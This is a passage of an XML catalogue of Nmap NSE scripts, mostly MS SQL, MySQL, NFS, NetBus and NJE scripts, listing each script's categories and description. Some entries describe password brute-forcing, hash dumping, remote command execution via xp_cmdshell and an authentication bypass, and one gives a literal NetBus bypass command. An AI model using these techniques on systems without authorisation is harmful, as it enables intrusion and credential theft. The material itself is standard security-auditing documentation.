<description>Attempts to authenticate to Microsoft SQL Servers using an empty password for&#xa;the sysadmin (sa) account.&#xa;&#xa;SQL Server credentials required: No (will not benefit from&#xa;&lt;code&gt;mssql.username&lt;/code&gt; &amp; &lt;code&gt;mssql.password&lt;/code&gt;).&#xa;Run criteria:&#xa;* Host script: Will run if the &lt;code&gt;mssql.instance-all&lt;/code&gt;, &lt;code&gt;mssql.instance-name&lt;/code&gt;&#xa;or &lt;code&gt;mssql.instance-port&lt;/code&gt; script arguments are used (see mssql.lua).&#xa;* Port script: Will run against any services identified as SQL Servers, but only&#xa;if the &lt;code&gt;mssql.instance-all&lt;/code&gt;, &lt;code&gt;mssql.instance-name&lt;/code&gt;&#xa;and &lt;code&gt;mssql.instance-port&lt;/code&gt; script arguments are NOT used.&#xa;&#xa;WARNING: SQL Server 2005 and later versions include support for account lockout&#xa;policies (which are enforced on a per-user basis).&#xa;&#xa;NOTE: Communication with instances via named pipes depends on the &lt;code&gt;smb&lt;/code&gt;&#xa;library. To communicate with (and possibly to discover) instances via named pipes,&#xa;the host must have at least one SMB port (e.g. TCP 445) that was scanned and&#xa;found to be open. Additionally, named pipe connections may require Windows&#xa;authentication to connect to the Windows host (via SMB) in addition to the&#xa;authentication required to connect to the SQL Server instances itself. See the&#xa;documentation and arguments for the &lt;code&gt;smb&lt;/code&gt; library for more information.&#xa;&#xa;NOTE: By default, the ms-sql-* scripts may attempt to connect to and communicate&#xa;with ports that were not included in the port list for the Nmap scan. This can&#xa;be disabled using the &lt;code&gt;mssql.scanned-ports-only&lt;/code&gt; script argument.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ms-sql-hasdbaccess.nse">
<categories><category>auth</category><category>discovery</category><category>safe</category></categories>
<description>Queries Microsoft SQL Server (ms-sql) instances for a list of databases a user has&#xa;access to.&#xa;&#xa;SQL Server credentials required: Yes (use &lt;code&gt;ms-sql-brute&lt;/code&gt;, &lt;code&gt;ms-sql-empty-password&lt;/code&gt;&#xa;and/or &lt;code&gt;mssql.username&lt;/code&gt; &amp; &lt;code&gt;mssql.password&lt;/code&gt;)&#xa;Run criteria:&#xa;* Host script: Will run if the &lt;code&gt;mssql.instance-all&lt;/code&gt;, &lt;code&gt;mssql.instance-name&lt;/code&gt;&#xa;or &lt;code&gt;mssql.instance-port&lt;/code&gt; script arguments are used (see mssql.lua).&#xa;* Port script: Will run against any services identified as SQL Servers, but only&#xa;if the &lt;code&gt;mssql.instance-all&lt;/code&gt;, &lt;code&gt;mssql.instance-name&lt;/code&gt;&#xa;and &lt;code&gt;mssql.instance-port&lt;/code&gt; script arguments are NOT used.&#xa;&#xa;The script needs an account with the sysadmin server role to work.&#xa;&#xa;When run, the script iterates over the credentials and attempts to run&#xa;the command for each available set of credentials.&#xa;&#xa;NOTE: The &quot;owner&quot; field in the results will be truncated at 20 characters. This&#xa;is a limitation of the &lt;code&gt;sp_MShasdbaccess&lt;/code&gt; stored procedure that the&#xa;script uses.&#xa;&#xa;NOTE: Communication with instances via named pipes depends on the &lt;code&gt;smb&lt;/code&gt;&#xa;library. To communicate with (and possibly to discover) instances via named pipes,&#xa;the host must have at least one SMB port (e.g. TCP 445) that was scanned and&#xa;found to be open. Additionally, named pipe connections may require Windows&#xa;authentication to connect to the Windows host (via SMB) in addition to the&#xa;authentication required to connect to the SQL Server instances itself. See the&#xa;documentation and arguments for the &lt;code&gt;smb&lt;/code&gt; library for more information.&#xa;&#xa;NOTE: By default, the ms-sql-* scripts may attempt to connect to and communicate&#xa;with ports that were not included in the port list for the Nmap scan. This can&#xa;be disabled using the &lt;code&gt;mssql.scanned-ports-only&lt;/code&gt; script argument.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ms-sql-info.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>Attempts to determine configuration and version information for Microsoft SQL&#xa;Server instances.&#xa;&#xa;SQL Server credentials required: No (will not benefit from&#xa;&lt;code&gt;mssql.username&lt;/code&gt; &amp; &lt;code&gt;mssql.password&lt;/code&gt;).&#xa;Run criteria:&#xa;* Host script: Will always run.&#xa;* Port script: N/A&#xa;&#xa;NOTE: Unlike previous versions, this script will NOT attempt to log in to SQL&#xa;Server instances. Blank passwords can be checked using the&#xa;&lt;code&gt;ms-sql-empty-password&lt;/code&gt; script. E.g.:&#xa;&lt;code&gt;nmap -sn -&#45;script ms-sql-empty-password -&#45;script-args mssql.instance-all &lt;host&gt;&lt;/code&gt;&#xa;&#xa;The script uses two means of getting version information for SQL Server instances:&#xa;* Querying the SQL Server Browser service, which runs by default on UDP port&#xa;1434 on servers that have SQL Server 2000 or later installed. However, this&#xa;service may be disabled without affecting the functionality of the instances.&#xa;Additionally, it provides imprecise version information.&#xa;* Sending a probe to the instance, causing the instance to respond with&#xa;information including the exact version number. This is the same method that&#xa;Nmap uses for service versioning; however, this script can also do the same for&#xa;instances accessible via Windows named pipes, and can target all of the&#xa;instances listed by the SQL Server Browser service.&#xa;&#xa;In the event that the script can connect to the SQL Server Browser service&#xa;(UDP 1434) but is unable to connect directly to the instance to obtain more&#xa;accurate version information (because ports are blocked or the &lt;code&gt;mssql.scanned-ports-only&lt;/code&gt;&#xa;argument has been used), the script will rely only upon the version number&#xa;provided by the SQL Server Browser/Monitor, which has the following limitations:&#xa;* For SQL Server 2000 and SQL Server 7.0 instances, the RTM version number is&#xa;always given, regardless of any service packs or patches installed.&#xa;* For SQL Server 2005 and later, the version number will reflect the service&#xa;pack installed, but the script will not be able to tell whether patches have&#xa;been installed.&#xa;&#xa;Where possible, the script will determine major version numbers, service pack&#xa;levels and whether patches have been installed. However, in cases where&#xa;particular determinations can not be made, the script will report only what can&#xa;be confirmed.&#xa;&#xa;NOTE: Communication with instances via named pipes depends on the &lt;code&gt;smb&lt;/code&gt;&#xa;library. To communicate with (and possibly to discover) instances via named pipes,&#xa;the host must have at least one SMB port (e.g. TCP 445) that was scanned and&#xa;found to be open. Additionally, named pipe connections may require Windows&#xa;authentication to connect to the Windows host (via SMB) in addition to the&#xa;authentication required to connect to the SQL Server instances itself. See the&#xa;documentation and arguments for the &lt;code&gt;smb&lt;/code&gt; library for more information.&#xa;&#xa;NOTE: By default, the ms-sql-* scripts may attempt to connect to and communicate&#xa;with ports that were not included in the port list for the Nmap scan. This can&#xa;be disabled using the &lt;code&gt;mssql.scanned-ports-only&lt;/code&gt; script argument.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ms-sql-ntlm-info.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>This script enumerates information from remote Microsoft SQL services with NTLM&#xa;authentication enabled.&#xa;&#xa;Sending a MS-TDS NTLM authentication request with an invalid domain and null&#xa;credentials will cause the remote service to respond with a NTLMSSP message&#xa;disclosing information to include NetBIOS, DNS, and OS build version.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ms-sql-query.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Runs a query against Microsoft SQL Server (ms-sql).&#xa;&#xa;SQL Server credentials required: Yes (use &lt;code&gt;ms-sql-brute&lt;/code&gt;, &lt;code&gt;ms-sql-empty-password&lt;/code&gt;&#xa;and/or &lt;code&gt;mssql.username&lt;/code&gt; &amp; &lt;code&gt;mssql.password&lt;/code&gt;)&#xa;Run criteria:&#xa;* Host script: Will run if the &lt;code&gt;mssql.instance-all&lt;/code&gt;, &lt;code&gt;mssql.instance-name&lt;/code&gt;&#xa;or &lt;code&gt;mssql.instance-port&lt;/code&gt; script arguments are used (see mssql.lua).&#xa;* Port script: Will run against any services identified as SQL Servers, but only&#xa;if the &lt;code&gt;mssql.instance-all&lt;/code&gt;, &lt;code&gt;mssql.instance-name&lt;/code&gt;&#xa;and &lt;code&gt;mssql.instance-port&lt;/code&gt; script arguments are NOT used.&#xa;&#xa;NOTE: Communication with instances via named pipes depends on the &lt;code&gt;smb&lt;/code&gt;&#xa;library. To communicate with (and possibly to discover) instances via named pipes,&#xa;the host must have at least one SMB port (e.g. TCP 445) that was scanned and&#xa;found to be open. Additionally, named pipe connections may require Windows&#xa;authentication to connect to the Windows host (via SMB) in addition to the&#xa;authentication required to connect to the SQL Server instances itself. See the&#xa;documentation and arguments for the &lt;code&gt;smb&lt;/code&gt; library for more information.&#xa;&#xa;NOTE: By default, the ms-sql-* scripts may attempt to connect to and communicate&#xa;with ports that were not included in the port list for the Nmap scan. This can&#xa;be disabled using the &lt;code&gt;mssql.scanned-ports-only&lt;/code&gt; script argument.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ms-sql-tables.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Queries Microsoft SQL Server (ms-sql) for a list of tables per database.&#xa;&#xa;SQL Server credentials required: Yes (use &lt;code&gt;ms-sql-brute&lt;/code&gt;, &lt;code&gt;ms-sql-empty-password&lt;/code&gt;&#xa;and/or &lt;code&gt;mssql.username&lt;/code&gt; &amp; &lt;code&gt;mssql.password&lt;/code&gt;)&#xa;Run criteria:&#xa;* Host script: Will run if the &lt;code&gt;mssql.instance-all&lt;/code&gt;, &lt;code&gt;mssql.instance-name&lt;/code&gt;&#xa;or &lt;code&gt;mssql.instance-port&lt;/code&gt; script arguments are used (see mssql.lua).&#xa;* Port script: Will run against any services identified as SQL Servers, but only&#xa;if the &lt;code&gt;mssql.instance-all&lt;/code&gt;, &lt;code&gt;mssql.instance-name&lt;/code&gt;&#xa;and &lt;code&gt;mssql.instance-port&lt;/code&gt; script arguments are NOT used.&#xa;&#xa;The sysdatabase table should be accessible by more or less everyone.&#xa;&#xa;Once we have a list of databases we iterate over it and attempt to extract&#xa;table names. In order for this to succeed we need to have either&#xa;sysadmin privileges or an account with access to the db. So, each&#xa;database we successfully enumerate tables from we mark as finished, then&#xa;iterate over known user accounts until either we have exhausted the users&#xa;or found all tables in all the databases.&#xa;&#xa;System databases are excluded.&#xa;&#xa;NOTE: Communication with instances via named pipes depends on the &lt;code&gt;smb&lt;/code&gt;&#xa;library. To communicate with (and possibly to discover) instances via named pipes,&#xa;the host must have at least one SMB port (e.g. TCP 445) that was scanned and&#xa;found to be open. Additionally, named pipe connections may require Windows&#xa;authentication to connect to the Windows host (via SMB) in addition to the&#xa;authentication required to connect to the SQL Server instances itself. See the&#xa;documentation and arguments for the &lt;code&gt;smb&lt;/code&gt; library for more information.&#xa;&#xa;NOTE: By default, the ms-sql-* scripts may attempt to connect to and communicate&#xa;with ports that were not included in the port list for the Nmap scan. This can&#xa;be disabled using the &lt;code&gt;mssql.scanned-ports-only&lt;/code&gt; script argument.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ms-sql-xp-cmdshell.nse">
<categories><category>intrusive</category></categories>
<description>Attempts to run a command using the command shell of Microsoft SQL&#xa;Server (ms-sql).&#xa;&#xa;SQL Server credentials required: Yes (use &lt;code&gt;ms-sql-brute&lt;/code&gt;, &lt;code&gt;ms-sql-empty-password&lt;/code&gt;&#xa;and/or &lt;code&gt;mssql.username&lt;/code&gt; &amp; &lt;code&gt;mssql.password&lt;/code&gt;)&#xa;Run criteria:&#xa;* Host script: Will run if the &lt;code&gt;mssql.instance-all&lt;/code&gt;, &lt;code&gt;mssql.instance-name&lt;/code&gt;&#xa;or &lt;code&gt;mssql.instance-port&lt;/code&gt; script arguments are used (see mssql.lua).&#xa;* Port script: Will run against any services identified as SQL Servers, but only&#xa;if the &lt;code&gt;mssql.instance-all&lt;/code&gt;, &lt;code&gt;mssql.instance-name&lt;/code&gt;&#xa;and &lt;code&gt;mssql.instance-port&lt;/code&gt; script arguments are NOT used.&#xa;&#xa;The script needs an account with the sysadmin server role to work.&#xa;&#xa;When run, the script iterates over the credentials and attempts to run&#xa;the command until either all credentials are exhausted or until the&#xa;command is executed.&#xa;&#xa;NOTE: Communication with instances via named pipes depends on the &lt;code&gt;smb&lt;/code&gt;&#xa;library. To communicate with (and possibly to discover) instances via named pipes,&#xa;the host must have at least one SMB port (e.g. TCP 445) that was scanned and&#xa;found to be open. Additionally, named pipe connections may require Windows&#xa;authentication to connect to the Windows host (via SMB) in addition to the&#xa;authentication required to connect to the SQL Server instances itself. See the&#xa;documentation and arguments for the &lt;code&gt;smb&lt;/code&gt; library for more information.&#xa;&#xa;NOTE: By default, the ms-sql-* scripts may attempt to connect to and communicate&#xa;with ports that were not included in the port list for the Nmap scan. This can&#xa;be disabled using the &lt;code&gt;mssql.scanned-ports-only&lt;/code&gt; script argument.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\msrpc-enum.nse">
<categories><category>safe</category><category>discovery</category></categories>
<description>Queries an MSRPC endpoint mapper for a list of mapped&#xa;services and displays the gathered information.&#xa;&#xa;As it is using smb library, you can specify optional&#xa;username and password to use.&#xa;&#xa;Script works much like Microsoft&apos;s rpcdump tool&#xa;or dcedump tool from SPIKE fuzzer.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\mtrace.nse">
<categories><category>discovery</category><category>safe</category><category>broadcast</category></categories>
<description>Queries for the multicast path from a source to a destination host.&#xa;&#xa;This works by sending an IGMP Traceroute Query and listening for IGMP&#xa;Traceroute responses. The Traceroute Query is sent to the first hop and&#xa;contains information about source, destination and multicast group addresses.&#xa;First hop defaults to the multicast All routers address. The default multicast&#xa;group address is 0.0.0.0 and the default destination is our own host address. A&#xa;source address must be provided. The responses are parsed to get interesting&#xa;information about interface addresses, used protocols and error codes.&#xa;&#xa;This is similar to the mtrace utility provided in Cisco IOS.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\murmur-version.nse">
<categories><category>version</category></categories>
<description>Detects the Murmur service (server for the Mumble voice communication&#xa;client) versions 1.2.X.&#xa;&#xa;The Murmur server listens on a TCP (control) and a UDP (voice) port&#xa;with the same port number. This script activates on both a TCP and UDP&#xa;port version scan. In both cases probe data is sent only to the UDP&#xa;port because it allows for a simple and informative ping command.&#xa;&#xa;The single probe will report on the server version, current user&#xa;count, maximum users allowed on the server, and bandwidth used for&#xa;voice communication. It is used by the Mumble client to ping known&#xa;Murmur servers.&#xa;&#xa;The IP address from which service detection is being ran will most&#xa;likely be temporarily banned by the target Murmur server due to&#xa;multiple incorrect handshakes (Nmap service probes). This ban makes&#xa;identifying the service via TCP impossible in practice, but does not&#xa;affect the UDP probe used by this script.&#xa;&#xa;It is possible to get a corrupt user count (usually +1) when doing a&#xa;TCP service scan due to previous service probe connections affecting&#xa;the server.&#xa;&#xa;See http://mumble.sourceforge.net/Protocol.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\mysql-audit.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Audits MySQL database server security configuration against parts of&#xa;the CIS MySQL v1.0.2 benchmark (the engine can be used for other MySQL&#xa;audits by creating appropriate audit files).&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\mysql-brute.nse">
<categories><category>intrusive</category><category>brute</category></categories>
<description>Performs password guessing against MySQL.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\mysql-databases.nse">
<categories><category>discovery</category><category>intrusive</category></categories>
<description>Attempts to list all databases on a MySQL server.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\mysql-dump-hashes.nse">
<categories><category>auth</category><category>discovery</category><category>safe</category></categories>
<description>Dumps the password hashes from an MySQL server in a format suitable for&#xa;cracking by tools such as John the Ripper.  Appropriate DB privileges (root) are required.&#xa;&#xa;The &lt;code&gt;username&lt;/code&gt; and &lt;code&gt;password&lt;/code&gt; arguments take precedence&#xa;over credentials discovered by the mysql-brute and mysql-empty-password&#xa;scripts.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\mysql-empty-password.nse">
<categories><category>intrusive</category><category>auth</category></categories>
<description>Checks for MySQL servers with an empty password for &lt;code&gt;root&lt;/code&gt; or&#xa;&lt;code&gt;anonymous&lt;/code&gt;.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\mysql-enum.nse">
<categories><category>intrusive</category><category>brute</category></categories>
<description>Performs valid-user enumeration against MySQL server using a bug&#xa;discovered and published by Kingcope&#xa;(http://seclists.org/fulldisclosure/2012/Dec/9).&#xa;&#xa;Server version 5.x are susceptible to an user enumeration&#xa;attack due to different messages during login when using&#xa;old authentication mechanism from versions 4.x and earlier.&#xa;&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\mysql-info.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>Connects to a MySQL server and prints information such as the protocol and&#xa;version numbers, thread ID, status, capabilities, and the password salt.&#xa;&#xa;If service detection is performed and the server appears to be blocking&#xa;our host or is blocked because of too many connections, then this script&#xa;isn&apos;t run (see the portrule).&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\mysql-query.nse">
<categories><category>auth</category><category>discovery</category><category>safe</category></categories>
<description>Runs a query against a MySQL database and returns the results as a table.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\mysql-users.nse">
<categories><category>auth</category><category>intrusive</category></categories>
<description>Attempts to list all users on a MySQL server.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\mysql-variables.nse">
<categories><category>discovery</category><category>intrusive</category></categories>
<description>Attempts to show all variables on a MySQL server.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\mysql-vuln-cve2012-2122.nse">
<categories><category>discovery</category><category>intrusive</category><category>vuln</category></categories>
<description>&#xa;Attempts to bypass authentication in MySQL and MariaDB servers by&#xa;exploiting CVE2012-2122. If its vulnerable, it will also attempt to&#xa;dump the MySQL usernames and password hashes.&#xa;&#xa;All MariaDB and MySQL versions up to 5.1.61, 5.2.11, 5.3.5, 5.5.22 are&#xa;vulnerable but exploitation depends on whether memcmp() returns an&#xa;arbitrary integer outside of -128..127 range.&#xa;&#xa;&quot;When a user connects to MariaDB/MySQL, a token (SHA over a password&#xa;and a random scramble string) is calculated and compared with the&#xa;expected value. Because of incorrect casting, it might&apos;ve happened&#xa;that the token and the expected value were considered equal, even if&#xa;the memcmp() returned a non-zero value. In this case MySQL/MariaDB&#xa;would think that the password is correct, even while it is not.&#xa;Because the protocol uses random strings, the probability of hitting&#xa;this bug is about 1/256.  Which means, if one knows a user name to&#xa;connect (and &quot;root&quot; almost always exists), she can connect using *any*&#xa;password by repeating connection attempts. ~300 attempts takes only a&#xa;fraction of second, so basically account password protection is as&#xa;good as nonexistent.&quot;&#xa;&#xa;Original public advisory:&#xa;* http://seclists.org/oss-sec/2012/q2/493&#xa;Interesting post about this vuln:&#xa;* https://community.rapid7.com/community/metasploit/blog/2012/06/11/cve-2012-2122-a-tragically-comedic-security-flaw-in-mysql&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\nat-pmp-info.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>Gets the routers WAN IP using the NAT Port Mapping Protocol (NAT-PMP).&#xa;The NAT-PMP protocol is supported by a broad range of routers including:&#xa;* Apple AirPort Express&#xa;* Apple AirPort Extreme&#xa;* Apple Time Capsule&#xa;* DD-WRT&#xa;* OpenWrt v8.09 or higher, with MiniUPnP daemon&#xa;* pfSense v2.0&#xa;* Tarifa (firmware) (Linksys WRT54G/GL/GS)&#xa;* Tomato Firmware v1.24 or higher. (Linksys WRT54G/GL/GS and many more)&#xa;* Peplink Balance&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\nat-pmp-mapport.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Maps a WAN port on the router to a local port on the client using the NAT Port Mapping Protocol (NAT-PMP).  It supports the following operations:&#xa;* map - maps a new external port on the router to an internal port of the requesting IP&#xa;* unmap - unmaps a previously mapped port for the requesting IP&#xa;* unmapall - unmaps all previously mapped ports for the requesting IP&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\nbd-info.nse">
<categories><category>discovery</category><category>intrusive</category></categories>
<description>Displays protocol and block device information from NBD servers.&#xa;&#xa;The Network Block Device protocol is used to publish block devices&#xa;over TCP. This script connects to an NBD server and attempts to pull&#xa;down a list of exported block devices and their details&#xa;&#xa;For additional information:&#xa;* https://github.com/NetworkBlockDevice/nbd/blob/master/doc/proto.md&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\nbns-interfaces.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>Retrieves IP addresses of the target&apos;s network interfaces via NetBIOS NS.&#xa;Additional network interfaces may reveal more information about the target,&#xa;including finding paths to hidden non-routed networks via multihomed systems.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\nbstat.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>Attempts to retrieve the target&apos;s NetBIOS names and MAC address.&#xa;&#xa;By default, the script displays the name of the computer and the logged-in&#xa;user; if the verbosity is turned up, it displays all names the system thinks it&#xa;owns.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ncp-enum-users.nse">
<categories><category>auth</category><category>safe</category></categories>
<description>Retrieves a list of all eDirectory users from the Novell NetWare Core Protocol (NCP) service.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ncp-serverinfo.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>Retrieves eDirectory server information (OS version, server name,&#xa;mounts, etc.) from the Novell NetWare Core Protocol (NCP) service.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ndmp-fs-info.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Lists remote file systems by querying the remote device using the Network&#xa;Data Management Protocol (ndmp). NDMP is a protocol intended to transport&#xa;data between a NAS device and the backup device, removing the need for the&#xa;data to pass through the backup server. The following products are known&#xa;to support the protocol:&#xa;* Amanda&#xa;* Bacula&#xa;* CA Arcserve&#xa;* CommVault Simpana&#xa;* EMC Networker&#xa;* Hitachi Data Systems&#xa;* IBM Tivoli&#xa;* Quest Software Netvault Backup&#xa;* Symantec Netbackup&#xa;* Symantec Backup Exec&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ndmp-version.nse">
<categories><category>version</category></categories>
<description>Retrieves version information from the remote Network Data Management Protocol&#xa;(ndmp) service. NDMP is a protocol intended to transport data between a NAS&#xa;device and the backup device, removing the need for the data to pass through&#xa;the backup server. The following products are known to support the protocol:&#xa;* Amanda&#xa;* Bacula&#xa;* CA Arcserve&#xa;* CommVault Simpana&#xa;* EMC Networker&#xa;* Hitachi Data Systems&#xa;* IBM Tivoli&#xa;* Quest Software Netvault Backup&#xa;* Symantec Netbackup&#xa;* Symantec Backup Exec&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\nessus-brute.nse">
<categories><category>intrusive</category><category>brute</category></categories>
<description>Performs brute force password auditing against a Nessus vulnerability scanning daemon using the NTP 1.2 protocol.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\nessus-xmlrpc-brute.nse">
<categories><category>intrusive</category><category>brute</category></categories>
<description>Performs brute force password auditing against a Nessus vulnerability scanning daemon using the XMLRPC protocol.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\netbus-auth-bypass.nse">
<categories><category>auth</category><category>safe</category><category>vuln</category></categories>
<description>Checks if a NetBus server is vulnerable to an authentication bypass&#xa;vulnerability which allows full access without knowing the password.&#xa;&#xa;For example a server running on TCP port 12345 on localhost with&#xa;this vulnerability is accessible to anyone. An attacker could&#xa;simply form a connection to the server ( ncat -C 127.0.0.1 12345 )&#xa;and login to the service by typing Password;1; into the console.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\netbus-brute.nse">
<categories><category>brute</category><category>intrusive</category></categories>
<description>Performs brute force password auditing against the Netbus backdoor (&quot;remote administration&quot;) service.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\netbus-info.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>Opens a connection to a NetBus server and extracts information about&#xa;the host and the NetBus service itself.&#xa;&#xa;The extracted host information includes a list of running&#xa;applications, and the hosts sound volume settings.&#xa;&#xa;The extracted service information includes its access control list&#xa;(acl), server information, and setup. The acl is a list of IP&#xa;addresses permitted to access the service. Server information&#xa;contains details about the server installation path, restart&#xa;persistence, user account that the server is running on, and the&#xa;amount of connected NetBus clients. The setup information contains&#xa;configuration details, such as the services TCP port number, traffic&#xa;logging setting, password, an email address for receiving login&#xa;notifications, an email address used for sending the notifications,&#xa;and an smtp-server used for notification delivery.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\netbus-version.nse">
<categories><category>version</category></categories>
<description>Extends version detection to detect NetBuster, a honeypot service&#xa;that mimes NetBus.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\nexpose-brute.nse">
<categories><category>intrusive</category><category>brute</category></categories>
<description>Performs brute force password auditing against a Nexpose vulnerability scanner&#xa;using the API 1.1.&#xa;&#xa;As the Nexpose application enforces account lockout after 4 incorrect login&#xa;attempts, the script performs only 3 guesses per default. This can be&#xa;altered by supplying the &lt;code&gt;brute.guesses&lt;/code&gt; argument a different&#xa;value or 0 (zero) to guess the whole dictionary.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\nfs-ls.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Attempts to get useful information about files from NFS exports.&#xa;The output is intended to resemble the output of &lt;code&gt;ls&lt;/code&gt;.&#xa;&#xa;The script starts by enumerating and mounting the remote NFS exports. After&#xa;that it performs an NFS GETATTR procedure call for each mounted point&#xa;in order to get its ACLs.&#xa;For each mounted directory the script will try to list its file entries&#xa;with their attributes.&#xa;&#xa;Since the file attributes shown in the results are the result of&#xa;GETATTR, READDIRPLUS, and similar procedures, the attributes&#xa;are the attributes of the local filesystem.&#xa;&#xa;These access permissions are shown only with NFSv3:&#xa;* Read:     Read data from file or read a directory.&#xa;* Lookup:   Look up a name in a directory&#xa;            (no meaning for non-directory objects).&#xa;* Modify:   Rewrite existing file data or modify existing&#xa;            directory entries.&#xa;* Extend:   Write new data or add directory entries.&#xa;* Delete:   Delete an existing directory entry.&#xa;* Execute:  Execute file (no meaning for a directory).&#xa;&#xa;Recursive listing is not implemented.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\nfs-showmount.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Shows NFS exports, like the &lt;code&gt;showmount -e&lt;/code&gt; command.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\nfs-statfs.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Retrieves disk space statistics and information from a remote NFS share.&#xa;The output is intended to resemble the output of &lt;code&gt;df&lt;/code&gt;.&#xa;&#xa;The script will provide pathconf information of the remote NFS if&#xa;the version used is NFSv3.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\nje-node-brute.nse">
<categories><category>intrusive</category><category>brute</category></categories>
<description>z/OS JES Network Job Entry (NJE) target node name brute force.&#xa;&#xa;NJE node communication is made up of an OHOST and an RHOST. Both fields&#xa;must be present when conducting the handshake. This script attemtps to&#xa;determine the target systems NJE node name.&#xa;&#xa;To initiate NJE the client sends a 33 byte record containing the type of&#xa;record, the hostname (RHOST), IP address (RIP), target (OHOST),&#xa;target IP (OIP) and a 1 byte response value (R) as outlined below:&#xa;&#xa;&lt;code&gt;&#xa;0 1 2 3 4 5 6 7 8 9 A B C D E F&#xa;+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+&#xa;|  TYPE       |     RHOST     |&#xa;+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+&#xa;|  RIP  |  OHOST      | OIP   |&#xa;+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+&#xa;| R |&#xa;+-+-+&#xa;&lt;/code&gt;&#xa;&#xa;* TYPE: Can either be &apos;OPEN&apos;, &apos;ACK&apos;, or &apos;NAK&apos;, in EBCDIC, padded by spaces to make 8 bytes. This script always send &apos;OPEN&apos; type.&#xa;* RHOST: Node name of the local machine initiating the connection. Set to &apos;FAKE&apos;.&#xa;* RIP: Hex value of the local systems IP address. Set to &apos;0.0.0.0&apos;&#xa;* OHOST: The value being enumerated to determine the targets NJE node name.&#xa;* OIP: IP address, in hex, of the target system. Set to &apos;0.0.0.0&apos;.&#xa;* R: The response. NJE will send an &apos;R&apos; of 0x01 if the OHOST is wrong or 0x04 if the OHOST is correct.&#xa;&#xa;By default this script will attempt the brute force a mainframes OHOST. If supplied with&#xa;the argument &lt;code&gt;nje-node-brute.ohost&lt;/code&gt; this script will attempt the bruteforce&#xa;the RHOST, setting OHOST to the value supplied to the argument.&#xa;&#xa;Since most systems will only have one OHOST name, it is recommended to use the&#xa;&lt;code&gt;brute.firstonly&lt;/code&gt; script argument.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\nje-pass-brute.nse">
<categories><category>intrusive</category><category>brute</category></categories>
<description>z/OS JES Network Job Entry (NJE) &apos;I record&apos; password brute forcer.&#xa;&#xa;After successfully negotiating an OPEN connection request, NJE requires sending,&#xa;what IBM calls, an &apos;I record&apos;. This initialization record may sometimes require&#xa;a password. This script, provided with a valid OHOST/RHOST for the NJE connection,&#xa;brute forces the password.&#xa;&#xa;Most systems only have one password, it is recommended to use the&#xa;&lt;code&gt;brute.firstonly&lt;/code&gt; script argument.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\nntp-ntlm-info.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>This script enumerates information from remote NNTP services with NTLM&#xa;authentication enabled.&#xa;&#xa;Sending an MS-NNTP NTLM authentication request with null credentials will&#xa;cause the remote service to respond with a NTLMSSP message disclosing&#xa;information to include NetBIOS, DNS, and OS build version.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\nping-brute.nse">
<categories><category>brute</category><category>intrusive</category></categories>
